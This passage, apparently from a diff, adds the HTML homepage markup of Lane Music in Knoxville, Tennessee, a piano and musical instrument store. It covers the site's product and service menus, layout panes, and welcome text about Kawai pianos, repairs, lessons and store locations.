+  <a id="dnn_SEARCH1_cmdSearchNew" class="desktopSearch" href="javascript:__doPostBack(&#39;dnn$SEARCH1$cmdSearchNew&#39;,&#39;&#39;)">Search</a>
+  </td>
+  </tr>
+ </table>
+ 
+</div>
+
+
+
+
+
+
+
+
+
+
+
+ </div>--><!--Search-->
+                    </div>
+                </div>
+            </div>
+            <div class="row-fluid">
+                <div id="Mainmenu" class="span10 offset2 Menu spmodule"> <div id="Mmenu" class="SpeedyDropDown"> <!-- DDRmenu v02.00.01 - Superfish template --><p class="MenuCenter"><a class="toggleMenu" href="#">Menu</a></p><nav class="main-navigation"><script type="text/javascript">
+        jQuery(function($) {
+        if ($(window).width() >= 700)
+        {
+          $("#dnn_MENU1").superfish(
+          {onShow:function() { if ($.browser.msie) this[0].style.removeAttribute('filter'); },MenuStyle:"Superfish"}
+          );
+        }
+        });
+      </script><ul class="nav" id="dnn_MENU1">
+    <li class="first"><a href="http://www.lanemusicknoxville.com/Pianos-Organs">Pianos &amp; Organs</a><ul>
+        <li class="first"><a href="http://www.lanemusicknoxville.com/Pianos-Organs/New-Pianos">New Pianos</a><ul>
+            <li class="first"><a href="http://www.lanemusicknoxville.com/Pianos-Organs/New-Pianos/New-Grand-Pianos">New Grand Pianos</a></li>
+            <li class=""><a href="http://www.lanemusicknoxville.com/Pianos-Organs/New-Pianos/New-Upright-Pianos">New Upright Pianos</a></li>
+            <li class=" last&#xA;        "><a href="http://www.lanemusicknoxville.com/Pianos-Organs/New-Pianos/New-Digital-Pianos">New Digital Pianos</a></li>
+          </ul>
+        </li>
+        <li class=""><a href="http://www.lanemusicknoxville.com/Pianos-Organs/Used-Pianos">Used Pianos</a><ul>
+            <li class="first"><a href="http://www.lanemusicknoxville.com/Pianos-Organs/Used-Pianos/Used-Grand-Pianos">Used Grand Pianos</a></li>
+            <li class=""><a href="http://www.lanemusicknoxville.com/Pianos-Organs/Used-Pianos/Used-Upright-Pianos">Used Upright Pianos</a></li>
+            <li class=" last&#xA;        "><a href="http://www.lanemusicknoxville.com/Pianos-Organs/Used-Pianos/Used-Digital-Pianos">Used Digital Pianos</a></li>
+          </ul>
+        </li>
+        <li class=""><a href="http://www.lanemusicknoxville.com/Pianos-Organs/Organs">Organs</a><ul>
+            <li class="first"><a href="http://www.lanemusicknoxville.com/Pianos-Organs/Organs/New-Organs">New Organs</a></li>
+            <li class=" last&#xA;        "><a href="http://www.lanemusicknoxville.com/Pianos-Organs/Organs/Used-Organs">Used Organs</a></li>
+          </ul>
+        </li>
+        <li class=""><a href="http://www.lanemusicknoxville.com/Pianos-Organs/Piano-Player-Systems">Piano Player Systems</a><ul>
+            <li class="first"><a href="http://www.lanemusicknoxville.com/Pianos-Organs/Piano-Player-Systems/PianoDisc">PianoDisc</a></li>
+            <li class=" last&#xA;        "><a href="http://www.lanemusicknoxville.com/Pianos-Organs/Piano-Player-Systems/QRS">QRS</a></li>
+          </ul>
+        </li>
+        <li class=""><a href="http://www.lanemusicknoxville.com/Pianos-Organs/Piano-Services">Piano Services</a><ul>
+            <li class="first"><a href="http://www.lanemusicknoxville.com/Pianos-Organs/Piano-Services/Piano-Tuning">Piano Tuning</a></li>
+            <li class=""><a href="http://www.lanemusicknoxville.com/Pianos-Organs/Piano-Services/Piano-Moving">Piano Moving</a></li>
+            <li class=" last&#xA;        "><a href="http://www.lanemusicknoxville.com/Pianos-Organs/Piano-Services/Piano-Rental">Piano Rental</a></li>
+          </ul>
+        </li>
+        <li class=""><a href="http://www.lanemusicknoxville.com/Pianos-Organs/Ask-An-Expert">Ask An Expert</a></li>
+        <li class=" last&#xA;        "><a href="http://www.lanemusicknoxville.com/Pianos-Organs/Schedule-Appointment">Schedule Appointment</a></li>
+      </ul>
+    </li>
+    <li class=""><a href="http://www.lanemusicknoxville.com/Musical-Instruments">Musical Instruments</a><ul>
+        <li class="first"><a href="http://www.lanemusicknoxville.com/Musical-Instruments/Guitars">Guitars</a><ul>
+            <li class="first"><a href="http://www.lanemusicknoxville.com/Musical-Instruments/Guitars/Acoustic-Guitars">Acoustic Guitars</a><ul>
+                <li class="first"><a href="http://www.lanemusicknoxville.com/Musical-Instruments/Guitars/Acoustic-Guitars/Breedlove-Acoustic-Guitars">Breedlove Acoustic Guitars</a></li>
+                <li class=""><a href="http://www.lanemusicknoxville.com/Musical-Instruments/Guitars/Acoustic-Guitars/Fender-Acoustic-Guitars">Fender Acoustic Guitars</a></li>
+                <li class=""><a href="http://www.lanemusicknoxville.com/Musical-Instruments/Guitars/Acoustic-Guitars/Gretsch-Acoustic-Guitars">Gretsch Acoustic Guitars</a></li>
+                <li class=""><a href="http://www.lanemusicknoxville.com/Musical-Instruments/Guitars/Acoustic-Guitars/Martin-Acoustic-Guitars">Martin Acoustic Guitars</a></li>
+                <li class=""><a href="http://www.lanemusicknoxville.com/Musical-Instruments/Guitars/Acoustic-Guitars/Oscar-Schmidt-Acoustic-Guitars">Oscar Schmidt Acoustic Guitars</a></li>
+                <li class=""><a href="http://www.lanemusicknoxville.com/Musical-Instruments/Guitars/Acoustic-Guitars/Squier-Acoustic-Guitars">Squier Acoustic Guitars</a></li>
+                <li class=""><a href="http://www.lanemusicknoxville.com/Musical-Instruments/Guitars/Acoustic-Guitars/Voyage-Air-Acoustic-Guitars">Voyage Air Acoustic Guitars</a></li>
+                <li class=""><a href="http://www.lanemusicknoxville.com/Musical-Instruments/Guitars/Acoustic-Guitars/Walden-Acoustic-Guitars">Walden Acoustic Guitars</a></li>
+                <li class=" last&#xA;        "><a href="http://www.lanemusicknoxville.com/Musical-Instruments/Guitars/Acoustic-Guitars/Yamaha-Acoustic-Guitars">Yamaha Acoustic Guitars</a></li>
+              </ul>
+            </li>
+            <li class=""><a href="http://www.lanemusicknoxville.com/Musical-Instruments/Guitars/Electric-Guitars">Electric Guitars</a><ul>
+                <li class="first"><a href="http://www.lanemusicknoxville.com/Musical-Instruments/Guitars/Electric-Guitars/EVH-Electric-Guitars">EVH Electric Guitars</a></li>
+                <li class=""><a href="http://www.lanemusicknoxville.com/Musical-Instruments/Guitars/Electric-Guitars/Fender-Electric-Guitars">Fender Electric Guitars</a></li>
+                <li class=""><a href="http://www.lanemusicknoxville.com/Musical-Instruments/Guitars/Electric-Guitars/Gretsch-Electric-Guitars">Gretsch Electric Guitars</a></li>
+                <li class=""><a href="http://www.lanemusicknoxville.com/Musical-Instruments/Guitars/Electric-Guitars/Michael-Kelly-Electric-Guitars">Michael Kelly Electric Guitars</a></li>
+                <li class=""><a href="http://www.lanemusicknoxville.com/Musical-Instruments/Guitars/Electric-Guitars/Oscar-Schmidt-Electric-Guitars">Oscar Schmidt Electric Guitars</a></li>
+                <li class=""><a href="http://www.lanemusicknoxville.com/Musical-Instruments/Guitars/Electric-Guitars/PRS-Electric-Guitars">PRS Electric Guitars</a></li>
+                <li class=" last&#xA;        "><a href="http://www.lanemusicknoxville.com/Musical-Instruments/Guitars/Electric-Guitars/Squier-Electric-Guitars">Squier Electric Guitars</a></li>
+              </ul>
+            </li>
+            <li class=" last&#xA;        "><a href="http://www.lanemusicknoxville.com/Musical-Instruments/Guitars/Miscellaneous">Miscellaneous</a><ul>
+                <li class="first"><a href="http://www.lanemusicknoxville.com/Musical-Instruments/Guitars/Miscellaneous/Banjos">Banjos</a></li>
+                <li class=""><a href="http://www.lanemusicknoxville.com/Musical-Instruments/Guitars/Miscellaneous/Mandolins">Mandolins</a></li>
+                <li class=" last&#xA;        "><a href="http://www.lanemusicknoxville.com/Musical-Instruments/Guitars/Miscellaneous/Ukuleles">Ukuleles</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+        <li class=""><a href="http://www.lanemusicknoxville.com/Musical-Instruments/Bass-Guitars">Bass Guitars</a><ul>
+            <li class="first"><a href="http://www.lanemusicknoxville.com/Musical-Instruments/Bass-Guitars/Fender-Bass-Guitars">Fender Bass Guitars</a></li>
+            <li class=" last&#xA;        "><a href="http://www.lanemusicknoxville.com/Musical-Instruments/Bass-Guitars/Squier-Bass-Guitars">Squier Bass Guitars</a></li>
+          </ul>
+        </li>
+        <li class=""><a href="http://www.lanemusicknoxville.com/Musical-Instruments/Amplifiers">Amplifiers</a><ul>
+            <li class="first"><a href="http://www.lanemusicknoxville.com/Musical-Instruments/Amplifiers/Guitar-Amplifiers">Guitar Amplifiers</a></li>
+            <li class=" last&#xA;        "><a href="http://www.lanemusicknoxville.com/Musical-Instruments/Amplifiers/Bass-Amplifiers">Bass Amplifiers</a></li>
+          </ul>
+        </li>
+        <li class=""><a href="http://www.lanemusicknoxville.com/Musical-Instruments/Keyboards">Keyboards</a><ul>
+            <li class="first"><a href="http://www.lanemusicknoxville.com/Musical-Instruments/Keyboards/Kawai-Keyboards">Kawai Keyboards</a></li>
+            <li class=""><a href="http://www.lanemusicknoxville.com/Musical-Instruments/Keyboards/Korg-Keyboards">Korg Keyboards</a></li>
+            <li class=""><a href="http://www.lanemusicknoxville.com/Musical-Instruments/Keyboards/Hammond-Keyboards">Hammond Keyboards</a></li>
+            <li class=""><a href="http://www.lanemusicknoxville.com/Musical-Instruments/Keyboards/Yamaha-Keyboards">Yamaha Keyboards</a></li>
+            <li class=""><a href="http://www.lanemusicknoxville.com/Musical-Instruments/Keyboards/Yamaha-Synthesizers">Yamaha Synthesizers</a></li>
+            <li class=" last&#xA;        "><a href="http://www.lanemusicknoxville.com/Musical-Instruments/Keyboards/Yamaha-Workstations">Yamaha Workstations</a></li>
+          </ul>
+        </li>
+        <li class=""><a href="http://www.lanemusicknoxville.com/Musical-Instruments/Drums-Percussion">Drums &amp; Percussion</a></li>
+        <li class=""><a href="http://www.lanemusicknoxville.com/Musical-Instruments/Pro-Audio">Pro Audio</a></li>
+        <li class=" last&#xA;        "><a href="http://www.lanemusicknoxville.com/Musical-Instruments/Instrument-Repair">Instrument Repair</a></li>
+      </ul>
+    </li>
+    <li class=""><a href="http://www.lanemusicknoxville.com/Band-Orchestra">Band &amp; Orchestra</a><ul>
+        <li class="first"><a href="http://www.lanemusicknoxville.com/Band-Orchestra/Band-Instruments">Band Instruments</a><ul>
+            <li class="first"><a href="http://www.lanemusicknoxville.com/Band-Orchestra/Band-Instruments/Bassoons">Bassoons</a></li>
+            <li class=""><a href="http://www.lanemusicknoxville.com/Band-Orchestra/Band-Instruments/Clarinets">Clarinets</a></li>
+            <li class=""><a href="http://www.lanemusicknoxville.com/Band-Orchestra/Band-Instruments/Cornets">Cornets</a></li>
+            <li class=""><a href="http://www.lanemusicknoxville.com/Band-Orchestra/Band-Instruments/Euphoniums">Euphoniums</a></li>
+            <li class=""><a href="http://www.lanemusicknoxville.com/Band-Orchestra/Band-Instruments/Flugelhorns">Flugelhorns</a></li>
+            <li class=""><a href="http://www.lanemusicknoxville.com/Band-Orchestra/Band-Instruments/Flutes">Flutes</a></li>
+            <li class=""><a href="http://www.lanemusicknoxville.com/Band-Orchestra/Band-Instruments/French-Horns">French Horns</a></li>
+            <li class=""><a href="http://www.lanemusicknoxville.com/Band-Orchestra/Band-Instruments/Oboes">Oboes</a></li>
+            <li class=""><a href="http://www.lanemusicknoxville.com/Band-Orchestra/Band-Instruments/Piccolos">Piccolos</a></li>
+            <li class=""><a href="http://www.lanemusicknoxville.com/Band-Orchestra/Band-Instruments/Saxophones">Saxophones</a></li>
+            <li class=""><a href="http://www.lanemusicknoxville.com/Band-Orchestra/Band-Instruments/Trombones">Trombones</a></li>
+            <li class=" last&#xA;        "><a href="http://www.lanemusicknoxville.com/Band-Orchestra/Band-Instruments/Trumpets">Trumpets</a></li>
+          </ul>
+        </li>
+        <li class=""><a href="http://www.lanemusicknoxville.com/Band-Orchestra/Orchestra-Instruments">Orchestra Instruments</a><ul>
+            <li class="first"><a href="http://www.lanemusicknoxville.com/Band-Orchestra/Orchestra-Instruments/Cellos">Cellos</a></li>
+            <li class=""><a href="http://www.lanemusicknoxville.com/Band-Orchestra/Orchestra-Instruments/Violas">Violas</a></li>
+            <li class=" last&#xA;        "><a href="http://www.lanemusicknoxville.com/Band-Orchestra/Orchestra-Instruments/Violins">Violins</a></li>
+          </ul>
+        </li>
+        <li class=""><a href="http://www.lanemusicknoxville.com/Band-Orchestra/Band-Orchestra-Information">Band &amp; Orchestra Information</a></li>
+        <li class=""><a href="http://www.lanemusicknoxville.com/Band-Orchestra/Instrument-Rental">Instrument Rental</a></li>
+        <li class=" last&#xA;        "><a href="http://www.lanemusicknoxville.com/Band-Orchestra/Instrument-Maintenance">Instrument Maintenance</a></li>
+      </ul>
+    </li>
+    <li class=""><a href="http://www.lanemusicknoxville.com/Local-Services">Local Services</a><ul>
+        <li class="first"><a href="http://www.lanemusicknoxville.com/Local-Services/Piano-Services">Piano Services</a><ul>
+            <li class="first"><a href="http://www.lanemusicknoxville.com/Local-Services/Piano-Services/Piano-Tuning">Piano Tuning</a></li>
+            <li class=""><a href="http://www.lanemusicknoxville.com/Local-Services/Piano-Services/Piano-Moving">Piano Moving</a></li>
+            <li class=" last&#xA;        "><a href="http://www.lanemusicknoxville.com/Local-Services/Piano-Services/Piano-Rental">Piano Rental</a></li>
+          </ul>
+        </li>
+        <li class=""><a href="http://www.lanemusicknoxville.com/Local-Services/Music-Lessons">Music Lessons</a><ul>
+            <li class="first"><a href="http://www.lanemusicknoxville.com/Local-Services/Music-Lessons/Lesson-Registration">Lesson Registration</a></li>
+            <li class=""><a href="http://www.lanemusicknoxville.com/Local-Services/Music-Lessons/Piano-Teachers">Piano Teachers</a></li>
+            <li class=""><a href="http://www.lanemusicknoxville.com/Local-Services/Music-Lessons/Guitar-Teachers">Guitar Teachers</a></li>
+            <li class=""><a href="http://www.lanemusicknoxville.com/Local-Services/Music-Lessons/Bass-Teachers">Bass Teachers</a></li>
+            <li class=""><a href="http://www.lanemusicknoxville.com/Local-Services/Music-Lessons/Drum-Teachers">Drum Teachers</a></li>
+            <li class=""><a href="http://www.lanemusicknoxville.com/Local-Services/Music-Lessons/Vocal-Teachers">Vocal Teachers</a></li>
+            <li class=""><a href="http://www.lanemusicknoxville.com/Local-Services/Music-Lessons/Banjo-Teachers">Banjo Teachers</a></li>
+            <li class=""><a href="http://www.lanemusicknoxville.com/Local-Services/Music-Lessons/Harp-Teachers">Harp Teachers</a></li>
+            <li class=""><a href="http://www.lanemusicknoxville.com/Local-Services/Music-Lessons/Violin-Teachers">Violin Teachers</a></li>
+            <li class=""><a href="http://www.lanemusicknoxville.com/Local-Services/Music-Lessons/Viola-Teachers">Viola Teachers</a></li>
+            <li class=""><a href="http://www.lanemusicknoxville.com/Local-Services/Music-Lessons/Brass-Teachers">Brass Teachers</a></li>
+            <li class=""><a href="http://www.lanemusicknoxville.com/Local-Services/Music-Lessons/Woodwind-Teachers">Woodwind Teachers</a></li>
+            <li class=" last&#xA;        "><a href="http://www.lanemusicknoxville.com/Local-Services/Music-Lessons/Teaching-Studios">Teaching Studios</a></li>
+          </ul>
+        </li>
+        <li class=""><a href="http://www.lanemusicknoxville.com/Local-Services/Instrument-Repair-Maintenance">Instrument Repair &amp; Maintenance</a></li>
+        <li class=""><a href="http://www.lanemusicknoxville.com/Local-Services/Return-Policy">Return Policy</a></li>
+        <li class=" last&#xA;        "><a href="http://www.lanemusicknoxville.com/Local-Services/Privacy-Policy">Privacy Policy</a></li>
+      </ul>
+    </li>
+    <li class=" last&#xA;        "><a href="http://www.lanemusicknoxville.com/Contact-Us">Contact Us</a></li>
+  </ul></nav> </div> </div>   
+            </div>
+        </div><!--MiainHeaderPaneClose-->
+        
+        
+<!----------- MainContentPage Start --------------------->
+        <div id="MainContentPage"CustomSection="edtPage" CustomTag="#MainContentPage" UserText="Main Content Page" DisabledControls="#Transparency, #BorderColor, #FontColor," WidthTag="#MainContentPage">
+            <div class="MainContentPaneA" class="span12"> <!--MainContentPaneA--> 
+                
+                <div class="row-fluid">
+                    <div id="Breadcrumb" class="span12 spmodule hide-on-phones"> <div class="breadcrumb_style"> <span id="dnn_dnnBreadcrumb_lblBreadCrumb"><a href="http://www.lanemusicknoxville.com/" class="BreadText">Home</a></span>
+ </div> </div>
+                </div> <!-- close Breadcrumb -->
+
+                
+                <div class="row-fluid">
+                    <div id="dnn_Slider" class="span8 slider spmodule ie8 DNNEmptyPane"> </div>
+                    <div id="dnn_SidebarRight" class="span4 spmodule DNNEmptyPane"></div>
+                </div>      
+                <div class="row-fluid">
+                    <div id="dnn_ContentPane" class="span12 spmodule DNNEmptyPane"></div>
+                </div>
+
+                <div class="row-fluid">
+                    <div id="dnn_HalfA" class="span6 LeftC spmodule DNNEmptyPane"></div>   
+                    <div id="dnn_HalfB" class="span6 LeftC spmodule DNNEmptyPane"></div>  
+                </div><!-- close 2Columns row-fluid -->
+
+                <div class="row-fluid">
+                    <div id="dnn_OptionA" class="span4 LeftC spmodule DNNEmptyPane"></div>
+                    <div id="dnn_OptionB" class="span8 LeftC spmodule DNNEmptyPane"></div>
+                </div> <!-- close 2Columns row-fluid  -->
+        	
+                <div class="row-fluid">  
+                    <div id="MainLeftSide" class="span8">
+                        <div class="row-fluid">
+                            <div id="dnn_LeftSideFullA" class="span12 LeftC spmodule DNNEmptyPane"></div>
+                        </div><!-- close row-fluid LSFull  --> 
+                        <div class="row-fluid">
+                            <div id="dnn_LeftSideHalfA" class="span6 LeftC spmodule DNNEmptyPane"></div>   
+                            <div id="dnn_LeftSideHalfB" class="span6 LeftC spmodule DNNEmptyPane"></div>  
+                        </div><!-- close LS2Columns --> 
+                        <div class="row-fluid">
+                            <div id="dnn_LeftSideFullB" class="span12 LeftC spmodule DNNEmptyPane"></div>
+                        </div><!-- close row-fluid LSFull  --> 
+                        <div class="row-fluid">
+                            <div id="dnn_LeftSideHalfC" class="span6 LeftC spmodule DNNEmptyPane"></div>   
+                            <div id="dnn_LeftSideHalfD" class="span6 LeftC spmodule DNNEmptyPane"></div>  
+                        </div><!-- close LS2Columns -->
+                    </div>
+                    <div id="dnn_RightSidePane" class="span4 LeftC spmodule DNNEmptyPane"></div>  
+                </div> <!-- close Right Full Layout -->
+            
+                <div class="row-fluid">
+                    <div id="dnn_ShowcaseA" class="span4 LeftC spmodule DNNEmptyPane"></div>
+                    <div id="dnn_ShowcaseB" class="span4 LeftC spmodule DNNEmptyPane"></div>
+                    <div id="dnn_ShowcaseC" class="span4 LeftC spmodule DNNEmptyPane"></div>
+                </div>
+
+                <div class="row-fluid">
+                    <div id="dnn_FullA" class="span12 LeftC spmodule DNNEmptyPane"></div>
+                </div>
+
+                <div class="row-fluid">
+                    <div id="dnn_FeatureA" class="span3 LeftC spmodule DNNEmptyPane"></div>
+                    <div id="dnn_FeatureB" class="span3 LeftC spmodule DNNEmptyPane"></div>
+                    <div id="dnn_FeatureC" class="span3 LeftC spmodule DNNEmptyPane"></div>
+                    <div id="dnn_FeatureD" class="span3 LeftC spmodule DNNEmptyPane"></div>
+                </div> <!-- close 4Columns row-fluid  -->
+            
+                <div class="row-fluid">
+                    <div id="dnn_LeftSide1Pane" class="span3 LeftC spmodule DNNEmptyPane"></div>  
+                    <div id="MainCenter" class="span6">
+                        <div class="row-fluid">
+                            <div id="dnn_BothFullA" class="span12 LeftC spmodule DNNEmptyPane"></div>
+                        </div><!-- close row-fluid BSFull  --> 
+                        <div class="row-fluid">
+                            <div id="dnn_BothHalfA" class="span6 LeftC spmodule DNNEmptyPane"></div>   
+                            <div id="dnn_BothHalfB" class="span6 LeftC spmodule DNNEmptyPane"></div>  
+                        </div><!-- close BS2Columns --> 
+                        <div class="row-fluid">
+                            <div id="dnn_BothFullB" class="span12 LeftC spmodule DNNEmptyPane"></div>
+                        </div><!-- close row-fluid BSFull  --> 
+                        <div class="row-fluid">
+                            <div id="dnn_BothHalfC" class="span6 LeftC spmodule DNNEmptyPane"></div>   
+                            <div id="dnn_BothHalfD" class="span6 LeftC spmodule DNNEmptyPane"></div>  
+                        </div><!-- close BS2Columns -->
+                    </div>
+                    <div id="dnn_RightSide1Pane" class="span3 LeftC spmodule DNNEmptyPane"></div>  
+                </div><!-- close Both Full Layout -->
+
+                <div class="row-fluid">
+                    <div id="dnn_FullB" class="span12 LeftC spmodule DNNEmptyPane"></div>
+                </div><!-- close row-fluid FullA  -->
+
+                <div class="row-fluid">
+                    <div id="dnn_HalfCPane" class="span6 LeftC spmodule DNNEmptyPane"></div>
+                    <div id="dnn_HalfDPane" class="span6 LeftC spmodule DNNEmptyPane"></div>
+                </div> <!-- close 2Columns row-fluid  -->
+
+                 <div class="row-fluid">
+                    <div id="dnn_PromoA" class="span8 LeftC spmodule DNNEmptyPane"></div>
+                    <div id="dnn_SidebarA" class="span4 LeftC spmodule DNNEmptyPane"></div>
+                </div> <!-- close 2Columns row-fluid  -->
+ 
+                
+
+                <div class="row-fluid">
+                <div id="dnn_LeftSidePane" class="span3 LeftC spmodule hidden-phone"><div class="DnnModule DnnModule-DNN_HTML DnnModule-799"><a name="799"></a><div id="dnn_ctr799_ContentPane"><!-- Start_Module_799 --><div id="dnn_ctr799_ModuleContent" class="DNNModuleContent ModDNNHTMLC">
+	<div id="dnn_ctr799_HtmlModule_lblContent" class="Normal">
+	<br />
+<p class="ShowcaseHeadline1">Categories and Links</p>
+<div class="accordion">
+<h3>Pianos &amp; Organs</h3>
+<div id="SidebarPaneList">
+<ul class="RightSidebarPane">
+    <li><a href="/Pianos-Organs/New-Pianos/New-Grand-Pianos"><span style="font-size: 16px;">New Grand Pianos</span></a></li>
+    <li><a href="/Pianos-OrgansNew-Pianos/New-Upright-Pianos"><span style="font-size: 16px;">New Upright Pianos</span></a></li>
+    <li><a href="/Pianos-Organs/New-Pianos/New-Digital-Pianos"><span style="font-size: 16px;">New Digital Pianos</span></a></li>
+    <li><a href="/Pianos-Organs/Used-Pianos/Used-Grand-Pianos"><span style="font-size: 16px;">Used Grand Pianos</span></a></li>
+    <li><a href="/Pianos-Organs/Used-Pianos/Used-Upright-Pianos"><span style="font-size: 16px;">Used Upright Pianos</span></a></li>
+    <li><a href="/Pianos-Organs/Organs/New-Organs"><span style="font-size: 16px;">New Organs</span></a></li>
+    <li><a href="/Pianos-Organs/Organs/Used-Organs"><span style="font-size: 16px;">Used Organs</span></a></li>
+</ul>
+</div>
+<h3>Musical Instruments</h3>
+<div id="SidebarPaneList">
+<ul class="RightSidebarPane">
+    <li><a href="/Musical-Instruments/Guitars"><span style="font-size: 16px;">Guitars</span></a></li>
+    <li><a href="/Musical-Instruments/Bass-Guitars"><span style="font-size: 16px;">Bass Guitars</span></a></li>
+    <li><a href="/Musical-Instruments/Amplifiers"><span style="font-size: 16px;">Amplifiers</span></a></li>
+    <li><a href="/Musical-Instruments/Keyboards"><span style="font-size: 16px;">Keyboards</span></a></li>
+    <li><a href="/Musical-Instruments/Drums-Percussion"><span style="font-size: 16px;">Drums &amp; Percussion</span></a></li>
+    <li><a href="/Musical-Instruments/Pro-Audio"><span style="font-size: 16px;">Pro Audio</span></a></li>
+    <li><a href="/Musical-Instruments/Instrument-Repair"><span style="font-size: 16px;">Instrument Repair</span></a></li>
+</ul>
+</div>
+<h3>Band &amp; Orchestra</h3>
+<div id="SidebarPaneList">
+<ul class="RightSidebarPane">
+    <li><a href="/Band-Orchestra/Band-Instruments"><span style="font-size: 16px;">Band Instruments</span></a></li>
+    <li><a href="/Band-Orchestra/Orchestra-Instruments"><span style="font-size: 16px;">Orchestra Instruments</span></a></li>
+    <li><a href="/Band-Orchestra/Band-Orchestra-Information"><span style="font-size: 16px;">Band &amp; Orch. Info</span></a></li>
+    <li><a href="/Band-Orchestra/Instrument-Maintenance"><spane style="font-size: 16px;">Instrument Maintenance</spane></a></li>
+    <li><a href="/Band-Orchestra/Rent-Instruments"><span style="font-size: 16px;">Instrument Rental</span></a></li>
+    <li><a href="/Local-Services/Music-Lessons/Brass-Teachers"><span style="font-size: 16px;">Brass Teachers</span></a></li>
+    <li><a href="/Local-Services/Music-Lessons/Woodwind-Teachers"><span style="font-size: 16px;">Woodwind Teachers</span></a></li>
+</ul>
+</div>
+<h3>Everything Else</h3>
+<div id="SidebarPaneList">
+<ul class="RightSidebarPane">
+    <li><a href="/Local-Services/Piano-Services/Piano-Tuning"><span style="font-size: 16px;">Piano Tuning</span></a></li>
+    <li><a href="/Local-Services/Piano-Services/Piano-Moving"><span style="font-size: 16px;">Piano Moving</span></a></li>
+    <li><a href="/Local-Services/Piano-Services/Piano-Rental"><span style="font-size: 16px;">Piano Rental</span></a></li>
+    <li><a href="/Local-Services/RMM-Classes"><span style="font-size: 16px;">RMM Classes</span></a></li>
+    <li><a href="/Local-Services/Music-Lessons"><span style="font-size: 16px;">Music Lessons</span></a></li>
+    <li><a href="/Contact-Us"><span style="font-size: 16px;">Locations/Contact</span></a></li>
+    <li><a href="/Local-Services/Returns"><span style="font-size: 16px;">Return Policy</span></a></li>
+</ul>
+</div>
+</div>
+<br />
+</div>
+
+</div><!-- End_Module_799 --></div>
+
+
+
+
+
+
+
+
+</div></div>   
+                    <div id="MainRightSide" class="span9">
+                        <div class="row-fluid">
+                            <div id="dnn_RightSideFullA" class="span12 LeftC spmodule"><div class="DnnModule DnnModule-DNN_HTML DnnModule-801"><a name="801"></a><div id="dnn_ctr801_ContentPane"><!-- Start_Module_801 --><div id="dnn_ctr801_ModuleContent" class="DNNModuleContent ModDNNHTMLC">
+	<div id="dnn_ctr801_HtmlModule_lblContent" class="Normal">
+	<br />
+<p class="FulltopHline bigspace">Welcome to Lane Music in Knoxville, TN</p>
+<p class="bigspace" style="text-align: justify;"><span style="font-size: 16px;">Lane Music is the <strong>Mid-South's</strong> and <strong>Knoxville's</strong> home for Pianos and Musical Instruments. We specialize in <a href="/c-37-pianos.aspx">Pianos</a>, <a href="/c-53-organs.aspx'">Organs</a>, <a href="c-4-guitars.aspx">Guitars</a>, <a href="/c-254-drums-percussion.aspx">Drums</a>, <a href="/c-2-band.aspx">Band Instruments</a>, and <a href="c-266-pro-audio.aspx">Pro Audio</a>. We are the exclusive <strong>Kawai Piano Dealer</strong> for the <a href="/t-locations.aspx">Mid-South</a>, <a href="http://www.memphispiano.com" target="_blank">Memphis</a>, and <a href="/t-knoxville.aspx">Knoxville</a>. We also are proud to be an authorized <strong>Fender</strong><strong>&reg;</strong>, <strong>EVH&reg;</strong>,&nbsp;and <strong>Gretsch<span>&reg;</span></strong>&nbsp;musical instrument dealer. </span></p>
+<p style="text-align: justify;">&nbsp;</p>
+</div>
+
+</div><!-- End_Module_801 --></div>
+
+
+
+
+
+
+
+
+</div></div>
+                        </div><!-- close row-fluid RSFull  --> 
+                        <div class="row-fluid">
+                            <div id="dnn_RightSideHalfA" class="span6 LeftC spmodule DNNEmptyPane"></div>   
+                            <div id="dnn_RightSideHalfB" class="span6 LeftC spmodule DNNEmptyPane"></div>  
+                        </div><!-- close RS2Columns --> 
+                        <div class="row-fluid">
+                            <div id="dnn_RightSideFullB" class="span12 LeftC spmodule"><div class="DnnModule DnnModule-DNN_HTML DnnModule-806"><a name="806"></a><div id="dnn_ctr806_ContentPane"><!-- Start_Module_806 --><div id="dnn_ctr806_ModuleContent" class="DNNModuleContent ModDNNHTMLC">
+	<div id="dnn_ctr806_HtmlModule_lblContent" class="Normal">
+	<p class="bigspace" style="text-align: justify;"><span style="font-size: 16px;">In addition to being the exclusive <strong>Kawai</strong> dealer for the Mid-South and retailer of all types of musical instruments and accessories, we also do repair and maintenance for musical instruments, from French Horns to Electric Guitars. We also provide a <a href="/t-lesssons.aspx">huge selection of music classes</a> for both children and adults, for both school and <a href="/t-rmm">fun</a>! Piano lessons, guitar lessons, even vocal and violin lessons, just to name only a few of the many classes we offer. With locations in <strong>Germantown</strong>, <strong>Memphis</strong>, and <strong>Knoxville</strong>, we provide music instruments and services all over <strong>Tennessee</strong>.</span></p>
+<p style="text-align: justify;"><span style="font-size: 16px;"><br />
+</span></p>
+<span style="font-size: 16px;"><br />
+</span>
+<p class="bigspace" style="text-align: justify;"><span style="font-size: 16px;">The above descriptions only give a small glimpse of our stores and ways to help. We haven't even touched on <a href="t-piano-tuning.aspx">piano tuning</a>, <a href="/t-piano-moving.aspx">piano moving</a>, <a href="t-rmm.aspx">Recreational Music Making</a> classes, or consignment opportunities. If you can any questions about our products or services, our expertly trained staff can answer any inquiry you have. Just stop by one of our <a href="/t-locations.aspx">three locations</a>, e-mail us by clicking <a href=" mailto:support@lanemusic.com">here</a>, or give us a call at 1-800-755-4071, and a member of our friendly expert staff will be glad to help you.</span></p>
+<span style="font-size: 16px;"><br />
+</span>
+<p class="bigspace" style="text-align: center;"><span style="font-size: 16px;">Don't forget to <a href="https://www.facebook.com/lanemusic" target="_blank">like us on Facebook </a>, or if Twitter is more your thing, be sure to <a href="https://www.twitter.com/lanemusicstore" target="_blank">follow us</a>!</span></p>
+<hr />
+</div>
+
+</div><!-- End_Module_806 --></div>
+
+
+
+
+
+
+
+
+</div></div>
+                        </div><!-- close row-fluid RSFull  --> 
+                        <div class="row-fluid">
+                            <div id="dnn_RightSideHalfC" class="span6 LeftC spmodule DNNEmptyPane"></div>   
+                            <div id="dnn_RightSideHalfD" class="span6 LeftC spmodule DNNEmptyPane"></div>  
+                        </div><!-- close RS2Columns -->
+                    </div>  
+                </div><!-- close Left Full Layout -->
+
+                <div class="row-fluid">
+                    <div id="dnn_FullC" class="span12 LeftC spmodule"><div class="DnnModule DnnModule-SpeedyTouchFlexi DnnModule-807"><a name="807"></a><div id="dnn_ctr807_ContentPane"><!-- Start_Module_807 --><div id="dnn_ctr807_ModuleContent" class="DNNModuleContent ModSpeedyTouchFlexiC">
+	
+
+     <!-- start SpeedyApp TouchFlexi Slider slideshow --> 
+
+<script type="text/javascript" src="/DesktopModules/SpeedyTouchFlexi/jquery.flexslider-min.js"></script>
+
+
